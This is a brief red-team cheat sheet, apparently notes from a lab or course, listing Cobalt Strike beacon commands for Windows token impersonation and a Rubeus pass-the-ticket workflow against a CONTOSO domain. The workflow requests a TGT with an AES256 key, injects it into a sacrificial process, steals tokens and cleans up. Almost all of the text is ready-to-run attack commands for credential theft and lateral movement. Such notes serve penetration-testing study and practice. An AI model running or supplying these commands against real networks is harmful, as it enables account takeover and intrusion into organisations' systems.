
Token Impersonation
```powershell
make_token CONTOSO\rsteel Passw0rd!
```

```powershell
process_browser            [SYSTEM LEVEL BEACON REQUIRED]

ps
token-store steal 5248
token-store show
token-store use 0 
token-store remove 0
```

```powershell
klist
rev2self
```

PtT
Obtain ticket from med-integrity beacon
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
```

Inject ticket into process from high-integrity beacon
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]
```

Steal token
```powershell
token-store steal 5248
token-store use 0 
```

```powershell
klist
rev2self
token-store remove 0
kill [ppid]
```